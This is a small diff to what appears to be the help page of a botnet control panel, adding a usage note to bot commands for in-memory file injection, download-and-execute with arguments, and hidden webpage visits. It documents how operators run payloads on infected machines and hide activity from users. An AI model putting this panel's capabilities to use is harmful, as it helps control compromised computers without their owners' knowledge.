@@ -374,7 +374,7 @@ include 'inc/stats.php';
 						<p>This command allows you to inject the file instead of dropping it to disk. Please note that this command will most likely break the injected bot's startup function, unless it creates a copy of itself to the disk. <b>This is only for native files</b>.</p>
 						<br>
 						<h4><b>Download & Execute (W/ Command Line Arguments)</b></h4>
-						<p>This command allows you to download and run a file, and include command line parameters.</p>
+						<p>This command allows you to download and run a file, and include command line parameters. Use <b>~</b> to split the URL from the Command Line Arguments.</p>
 						<br>
 						<h4><b>Visit Webpage (Hidden)</b></h4>
 						<p>This command completely hides the browser window from the user, but also prevents any interaction. This option is best for views only.</p>
